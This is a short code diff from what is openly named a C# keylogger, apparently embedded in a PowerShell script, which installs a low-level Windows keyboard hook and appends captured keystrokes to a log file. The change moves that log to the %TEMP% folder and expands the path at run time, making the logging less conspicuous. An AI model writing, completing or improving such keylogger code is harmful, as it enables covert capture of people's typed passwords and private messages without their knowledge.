@@ -173,14 +173,15 @@ namespace KeyLogger {
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
 
-    private const string logFileName = @"'+$PSScriptRoot+'\keylogger.txt";
+    private const string logFileName = @"%TEMP%\keylogger.txt";
     private static StreamWriter logFile;
 
     private static HookProc hookProc = HookCallback;
     private static IntPtr hookId = IntPtr.Zero;
 
     public static void Main() {
-      logFile = File.AppendText(logFileName);
+	  string expandedFileName = Environment.ExpandEnvironmentVariables(logFileName);
+      logFile = File.AppendText(expandedFileName);
       logFile.AutoFlush = true;
 
       hookId = SetHook(hookProc);
